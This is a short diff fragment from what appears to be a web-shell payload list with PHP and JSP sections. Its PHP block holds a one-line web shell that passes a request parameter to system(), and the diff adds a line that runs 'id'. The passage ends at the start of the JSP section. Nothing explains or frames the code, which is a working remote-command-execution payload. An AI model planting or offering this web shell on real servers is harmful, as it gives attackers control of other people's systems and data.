@@ -8,8 +8,8 @@ Code: php
 
 ```php
 <?php system($_REQUEST["cmd"]); ?>
+<?php system('id'); ?>
 ```
-
 Code: jsp
 
 ```jsp
